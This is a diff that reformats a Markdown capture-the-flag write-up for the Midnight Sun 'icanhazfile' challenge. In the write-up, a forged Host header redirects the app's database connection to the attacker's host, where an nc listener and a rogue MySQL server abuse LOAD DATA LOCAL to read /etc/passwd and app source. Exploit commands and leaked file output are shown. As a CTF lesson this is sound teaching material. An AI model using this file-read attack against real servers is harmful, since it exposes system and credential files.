@@ -19,24 +19,32 @@ user.
 Analyzing the web we realize that changing the host header gives an error
 connection to the database:
 
-```GET /login HTTP/1.1```
-```Host: icanhazfile-01.play.midnightsunctf.se:3002```
+```
+GET /login HTTP/1.1
+Host: icanhazfile-01.play.midnightsunctf.se:3002
+```
 
-```GET /login HTTP/1.1```
-```Host: 163.172.175.139```
+```
+GET /login HTTP/1.1
+Host: 163.172.175.139
 
-```/app/app.py: could not connect to database```
+/app/app.py: could not connect to database
+```
 
 We open a port in 3306 to see if we receive any connection and see that does not
 connect, with Burp Collaborator we see that receives a DNS request, with the
 subdomain: database.ip.com, create a subdomain and raise the port with nc.
 
-```GET /login HTTP/1.1```
-```Host: borjmz.com```
+```
+GET /login HTTP/1.1
+Host: borjmz.com
+```
 
-```root@midnightsun:~# nc -lvp 3306```
-```listening on [any] 3306 ```
-```connect to [10.64.180.121] from ... [52.208.15.104] 36136```
+```
+root@midnightsun:~# nc -lvp 3306
+listening on [any] 3306 
+connect to [10.64.180.121] from ... [52.208.15.104] 36136
+```
 
 What we're trying to do is set up a MySQL server to see if it gives us back
 information about the tables or something useful to continue with the
@@ -49,31 +57,32 @@ http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/
 
 We put a tcpdump to the listening and we receive the connection of the SQL:
 
-```.... .... 1... .... = Can Use LOAD DATA LOCAL: Set```
+```.... .... 1... .... = Can Use LOAD DATA LOCAL: Set
 
-```Client Capabilities: 0xa285```
-```.... .... .... ...1 = Long Password: Set```
-```.... .... .... ..0. = Found Rows: Not set```
-```.... .... .... .1.. = Long Column Flags: Set```
-```.... .... .... 0... = Connect With Database: Not set```
-```.... .... ...0 .... = Don't Allow database.table.column: Not set```
-```.... .... ..0. .... = Can use compression protocol: Not set```
-```.... .... .0.. .... = ODBC Client: Not set```
-```.... .... 1... .... = Can Use LOAD DATA LOCAL: Set```
-```.... ...0 .... .... = Ignore Spaces before '(': Not set```
-```.... ..1. .... .... = Speaks 4.1 protocol (new flag): Set```
-```.... .0.. .... .... = Interactive Client: Not set```
-```.... 0... .... .... = Switch to SSL after handshake: Not set```
-```...0 .... .... .... = Ignore sigpipes: Not set```
-```..1. .... .... .... = Knows about transactions: Set```
-```.0.. .... .... .... = Speaks 4.1 protocol (old flag): Not set```
-```1... .... .... .... = Can do 4.1 authentication: Set```
-
+Client Capabilities: 0xa285
+.... .... .... ...1 = Long Password: Set
+.... .... .... ..0. = Found Rows: Not set
+.... .... .... .1.. = Long Column Flags: Set
+.... .... .... 0... = Connect With Database: Not set
+.... .... ...0 .... = Don't Allow database.table.column: Not set
+.... .... ..0. .... = Can use compression protocol: Not set
+.... .... .0.. .... = ODBC Client: Not set
+.... .... 1... .... = Can Use LOAD DATA LOCAL: Set
+.... ...0 .... .... = Ignore Spaces before '(': Not set
+.... ..1. .... .... = Speaks 4.1 protocol (new flag): Set
+.... .0.. .... .... = Interactive Client: Not set
+.... 0... .... .... = Switch to SSL after handshake: Not set
+...0 .... .... .... = Ignore sigpipes: Not set
+..1. .... .... .... = Knows about transactions: Set
+.0.. .... .... .... = Speaks 4.1 protocol (old flag): Not set
+1... .... .... .... = Can do 4.1 authentication: Set
+```
 ### Exploitation
 
 We tested the balsn exploit and made some modifications.
 
-```root@midnightsun:~# python3 mysql_exploit.py /etc/passwd```
+```
+root@midnightsun:~# python3 mysql_exploit.py /etc/passwd```
 ```[+] Trying to bind to 0.0.0.0 on port 3306: Done```
 ```[+] Waiting for connections on 0.0.0.0:3306: Got connection from * on port 36150```
 
@@ -106,9 +115,10 @@ We tested the balsn exploit and made some modifications.
 ```systemd-network:x:101:103::/run/systemd/netif:/bin/false\n```
 ```systemd-resolve:x:102:104::/run/systemd/resolve:/bin/false\n```
 ```systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\n```
-```_apt:x:104:65534::/nonexistent:/bin/false\n\x00\x00\x00\x03'```
+```_apt:x:104:65534::/nonexistent:/bin/false\n\x00\x00\x00\x03'
 
-```[*] Closed connection to 52.208.15.104 port 36150```
+[*] Closed connection to 52.208.15.104 port 36150
+```
 
 We receive the output of /etc/password, read /app/app.py to get the source code
 of the web, we try to read the typical files of the system to get more
